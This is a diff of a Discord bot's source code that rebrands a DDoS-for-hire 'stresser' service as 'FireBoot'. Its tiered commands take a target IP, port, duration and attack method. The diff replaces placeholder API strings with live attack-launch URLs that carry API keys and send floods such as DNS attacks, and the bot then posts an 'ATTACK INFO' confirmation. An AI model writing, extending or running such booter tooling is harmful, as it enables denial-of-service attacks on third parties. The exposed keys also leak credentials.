@@ -327,12 +327,12 @@ client.on('message', async msg=>{
             if(!args[2]) return msg.reply('Usage: F-free [ip] [port] [time]')
             if(!args[3]) return msg.reply('Usage: F-free [ip] [port] [time]')
             if(args[4]) return msg.reply('Usage: F-free [ip] [port] [time]')
-            if(args[2] === "1.1.1.1") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "1.0.0.1") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "8.8.8.8") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "8.8.4.4") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "153.31.113.27") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "64.229.121.31") return msg.reply('Guap Stresser Rejects All Attacks To This IP')      
+            if(args[2] === "1.1.1.1") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "1.0.0.1") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "8.8.8.8") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "8.8.4.4") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "153.31.113.27") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "64.229.121.31") return msg.reply('FireBoot Rejects All Attacks To This IP')      
            
             
             
@@ -344,14 +344,14 @@ client.on('message', async msg=>{
                 
                const resp = await axios({
                   method: "GET",
-                  url: ("API")
+                  url: ("http://v2.fireboot.xyz/index.php?page=Api&key=2h7jjht100bl3uq&host="+args[1]+"&port="+args[2]+"&time="+args[3]+"&method=DNS")
                 });
                 await sleep(1000)
                 console.log("Attack Sent To: " +args[2]+ "  Time: " +args[4]);
                 msg.reply("Your Attack Info...")
                 var business = new Discord.RichEmbed()
                   .setColor(15158332)
-                  .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[1]}\nPort: ${args[2]}\nAttack Time: ${args[3]}\nThank You For Choosing Guap Stresser`)
+                  .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[1]}\nPort: ${args[2]}\nAttack Time: ${args[3]}\nThank You For Choosing FireBoot`)
                 msg.channel.send(business)
 
                 freeplancooldown.add(msg.author.id);
@@ -372,12 +372,12 @@ client.on('message', async msg=>{
             if(!args[3]) return msg.reply('USAGE: F-bronze [method] [ip] [*port] [time]')
             if(!args[4]) return msg.reply('USAGE: F-bronze [method] [ip] [port] [*time]')
             if(args[5]) return msg.reply('USAGE: F-bronze [method] [ip] [port] [time]')
-            if(args[2] === "1.1.1.1") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "1.0.0.1") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "8.8.8.8") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "8.8.4.4") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "153.31.113.27") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "64.229.121.31") return msg.reply('Guap Stresser Rejects All Attacks To This IP')      
+            if(args[2] === "1.1.1.1") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "1.0.0.1") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "8.8.8.8") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "8.8.4.4") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "153.31.113.27") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "64.229.121.31") return msg.reply('FireBoot Rejects All Attacks To This IP')      
            
             
             
@@ -386,7 +386,7 @@ client.on('message', async msg=>{
             if (talkedRecently.has(msg.author.id)) {
                 msg.channel.send("Wait Until Your Last Attack Ends." + msg.author);
                 } else {
-                    axios.get("API")
+                    axios.get("http://v2.fireboot.xyz/index.php?page=Api&key=nlspss7hrk7xrbp&host="+args[2]+"&port="+args[3]+"&time="+args[4]+"&method="+args[1])
                     .then((response) => {
                         console.log(response.data);
                         console.log(response.status);
@@ -399,7 +399,7 @@ client.on('message', async msg=>{
                 msg.reply("Your Attack Info...")
                 var business = new Discord.RichEmbed()
                   .setColor(15158332)
-                  .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser`)
+                  .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot`)
                 msg.channel.send(business)
                 talkedRecently.add(msg.author.id);
                 setTimeout(() => {                
@@ -420,12 +420,12 @@ client.on('message', async msg=>{
             if(!args[3]) return msg.reply('USAGE: F-silver [method] [ip] [*port] [time]')
             if(!args[4]) return msg.reply('USAGE: F-silver [method] [ip] [port] [*time]')
             if(args[5]) return msg.reply('USAGE: F-silver [method] [ip] [port] [time]')
-            if(args[2] === "1.1.1.1") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "1.0.0.1") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "8.8.8.8") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "8.8.4.4") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "153.31.113.27") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "64.229.121.31") return msg.reply('Guap Stresser Rejects All Attacks To This IP')      
+            if(args[2] === "1.1.1.1") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "1.0.0.1") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "8.8.8.8") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "8.8.4.4") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "153.31.113.27") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "64.229.121.31") return msg.reply('FireBoot Rejects All Attacks To This IP')      
            
            
            
@@ -435,7 +435,7 @@ client.on('message', async msg=>{
                 msg.channel.send("Wait Until Your Last Attack Ends." + msg.author);
                 } else {
             
-                    axios.get("API")
+                    axios.get("http://v2.fireboot.xyz/index.php?page=Api&key=nlspss7hrk7xrbp&host="+args[2]+"&port="+args[3]+"&time="+args[4]+"&method="+args[1])
                     .then((response) => {
                         console.log(response.data);
                         console.log(response.status);
@@ -449,7 +449,7 @@ client.on('message', async msg=>{
                 msg.reply("Your Attack Info...")
                 var business = new Discord.RichEmbed()
                   .setColor(15158332)
-                  .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser`)
+                  .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot`)
                 msg.channel.send(business)
                 talkedRecently.add(msg.author.id);
                 setTimeout(() => {                
@@ -469,12 +469,12 @@ client.on('message', async msg=>{
             if(!args[3]) return msg.reply('USAGE: F-gold [method] [ip] [*port] [time]')
             if(!args[4]) return msg.reply('USAGE: F-gold [method] [ip] [port] [*time]')
             if(args[5]) return msg.reply('USAGE: F-gold [method] [ip] [port] [time]')
-            if(!args[2] === "1.1.1.1") return msg.reply('Guap Stresser Rejects All Hits To This IP')
-            if(!args[2] === "1.0.0.1") return msg.reply('Guap Stresser Rejects All Hits To This IP')
-            if(!args[2] === "8.8.8.8") return msg.reply('Guap Stresser Rejects All Hits To This IP')
-            if(!args[2] === "8.8.4.4") return msg.reply('Guap Stresser Rejects All Hits To This IP')
-            if(args[2] === "153.31.113.27") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
-            if(args[2] === "64.229.121.31") return msg.reply('Guap Stresser Rejects All Attacks To This IP')
+            if(!args[2] === "1.1.1.1") return msg.reply('FireBoot Rejects All Hits To This IP')
+            if(!args[2] === "1.0.0.1") return msg.reply('FireBoot Rejects All Hits To This IP')
+            if(!args[2] === "8.8.8.8") return msg.reply('FireBoot Rejects All Hits To This IP')
+            if(!args[2] === "8.8.4.4") return msg.reply('FireBoot Rejects All Hits To This IP')
+            if(args[2] === "153.31.113.27") return msg.reply('FireBoot Rejects All Attacks To This IP')
+            if(args[2] === "64.229.121.31") return msg.reply('FireBoot Rejects All Attacks To This IP')
 
 
             if(args[4] > 1500) return msg.reply("Can't Use More Than 1500 Seconds.")
@@ -492,7 +492,7 @@ client.on('message', async msg=>{
                                 msg.reply("Your Attack Info.")
                                 var business = new Discord.RichEmbed()
                                 .setColor(15158332)
-                                .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser!`)
+                                .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot!`)
                                 msg.channel.send(business)
                                 //Where The URL Request Goes
                                 await sleep(1000)
@@ -507,7 +507,7 @@ client.on('message', async msg=>{
                                 msg.reply("Your Attack Info.")
                                 var business = new Discord.RichEmbed()
                                 .setColor(15158332)
-                                .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser!`)
+                                .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot!`)
                                 msg.channel.send(business)
                                 //Where The URL Request Goes                              
                                 await sleep(1000)
@@ -522,7 +522,7 @@ client.on('message', async msg=>{
                           msg.reply("Your Attack Info.")
                           var business = new Discord.RichEmbed()
                           .setColor(15158332)
-                          .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser!`)
+                          .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot!`)
                           msg.channel.send(business)
                           //Where The URL Request Goes
                           await sleep(1000)
@@ -542,7 +542,7 @@ client.on('message', async msg=>{
                         msg.reply("Your Attack Info.")
                         var business = new Discord.RichEmbed()
                         .setColor(15158332)
-                        .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser!`)
+                        .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot!`)
                         msg.channel.send(business)
                         //Where The URL Request Goes
                         await sleep(1000)
@@ -557,7 +557,7 @@ client.on('message', async msg=>{
                           msg.reply("Your Attack Info.")
                           var business = new Discord.RichEmbed()
                           .setColor(15158332)
-                          .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser!`)
+                          .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot!`)
                           msg.channel.send(business)
                           //Where The URL Request Goes
                           await sleep(1000)
@@ -576,7 +576,7 @@ client.on('message', async msg=>{
                     msg.reply("Your Attack Info.")
                     var business = new Discord.RichEmbed()
                     .setColor(15158332)
-                    .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing Guap Stresser!`)
+                    .addField("__**ATTACK INFO**__", `Ip/URL Attacked: ${args[2]}\nPort: ${args[3]}\nMethod: ${args[1]}\nAttack Time: ${args[4]}\nThank You For Choosing FireBoot!`)
                     msg.channel.send(business)
                     //Where The URL Request Goes
                     await sleep(1000)
